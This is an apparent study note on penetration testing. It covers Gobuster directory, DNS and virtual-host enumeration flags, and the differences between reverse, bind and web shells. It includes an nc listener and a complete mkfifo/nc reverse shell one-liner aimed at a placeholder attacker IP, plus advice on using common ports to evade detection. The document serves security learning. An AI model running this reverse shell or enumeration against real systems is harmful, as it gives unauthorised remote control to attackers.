# Gobuster — Directory & DNS Enumeration

## What is Gobuster?
A brute force enumeration tool for web directories, DNS subdomains, and virtual hosts.

- **Enumeration** — listing all available resources whether accessible or not
- **Brute force** — trying every entry in a wordlist until a match is found

---

## Core Modes

| Mode | What it does |
|------|-------------|
| `dir` | Enumerates web directories and files |
| `dns` | Enumerates DNS subdomains |
| `vhost` | Enumerates virtual hosts on the same machine |

---

## Global Flags (all modes)

| Flag | Long Flag | Description |
|------|-----------|-------------|
| `-t` | `--threads` | Number of threads (default: 10) |
| `-w` | `--wordlist` | Path to wordlist |
| `-o` | `--output` | Write results to a file |
| `--delay` | | Time between requests (avoids detection) |
| `--debug` | | Troubleshoot unexpected errors |

---

## dir Mode — Web Directory Enumeration
```bash
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
```

| Flag | Long Flag | Description |
|------|-----------|-------------|
| `-x` | `--extensions` | File extensions to scan e.g. `.php,.js` |
| `-c` | `--cookies` | Pass a cookie with each request (session ID) |
| `-H` | `--headers` | Add a custom header to each request |
| `-k` | `--no-tls-validation` | Skip TLS cert check (useful for CTFs) |
| `-n` | `--no-status` | Hide status codes from output |
| `-s` | `--status-codes` | Only show specific status codes e.g. `200` |
| `-b` | `--status-codes-blacklist` | Hide specific status codes (overrides `-s`) |
| `-U` | `--username` | Username for authenticated requests |
| `-P` | `--password` | Password for authenticated requests |
| `-r` | `--followredirect` | Follow HTTP redirects (301, 302) |

---

## dns Mode — Subdomain Enumeration
```bash
gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt
```

| Flag | Long Flag | Description |
|------|-----------|-------------|
| `-d` | `--domain` | Target domain to enumerate |
| `-i` | `--show-ips` | Show IP addresses subdomains resolve to |
| `-c` | `--show-cname` | Show CNAME records (cannot use with `-i`) |
| `-r` | `--resolver` | Custom DNS server to use |

---

## vhost Mode — Virtual Host Enumeration
```bash
gobuster vhost -u http://target.com -w /usr/share/wordlists/vhosts.txt --append-domain
```

| Flag | Long Flag | Description |
|------|-----------|-------------|
| `-u` | `--url` | Base URL / target domain |
| `--append-domain` | | Appends base domain to each word e.g. `word.example.com` |
| `-m` | `--method` | HTTP method to use (GET, POST) |
| `--exclude-length` | | Filter results by response body length |
| `-r` | `--follow-redirect` | Follow HTTP redirects |

---

# Shells

## What is a Shell?
Software that lets a user interact with an OS — usually a command-line interface.

**Why attackers want a shell:**

| Purpose | Description |
|---------|-------------|
| Remote control | Execute commands on the target system |
| Privilege escalation | Gain admin/root access from limited access |
| Data exfiltration | Read and copy sensitive files |
| Persistence | Create backdoors for future access |
| Post-exploitation | Deploy malware, create hidden accounts |
| Pivoting | Use compromised system to attack other systems on the network |

---

## Reverse Shell
Target connects **back** to attacker — helps bypass firewalls.

**Attacker listens:**
```bash
nc -lvnp 4444
```

| Flag | Description |
|------|-------------|
| `-l` | Listen for incoming connection |
| `-v` | Verbose mode |
| `-n` | No DNS resolution — use IP only |
| `-p` | Port to listen on |

> Attackers use ports like 53, 80, 443, 8080 to blend in with normal traffic

**Reverse shell payload:**
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc ATTACKER_IP PORT >/tmp/f
```

| Part | What it does |
|------|-------------|
| `rm -f /tmp/f` | Removes existing named pipe to avoid conflicts |
| `mkfifo /tmp/f` | Creates a named pipe for two-way communication |
| `cat /tmp/f` | Reads input from the pipe |
| `bash -i 2>&1` | Opens interactive shell, redirects errors to output |
| `nc ATTACKER_IP PORT` | Sends shell output to attacker |
| `>/tmp/f` | Sends response back into pipe (bi-directional) |

---

## Bind Shell
Compromised system **listens** — attacker connects to it.
Less common as firewalls usually block inbound connections.

---

## Web Shell
A script hosted on a compromised web server that executes commands through the browser.

| Shell | Description |
|-------|-------------|
| **p0wny-shell** | Minimalistic single-file PHP shell |
| **b374k** | Feature-rich PHP shell with file management |
| **c99** | Well-known robust PHP shell with extensive functionality |

---

## Useful Utilities

| Tool | Purpose |
|------|---------|
| **rlwrap** | Adds keyboard history and editing to shell sessions |
| **socat** | Creates socket connections between two hosts — upgrades basic shells |
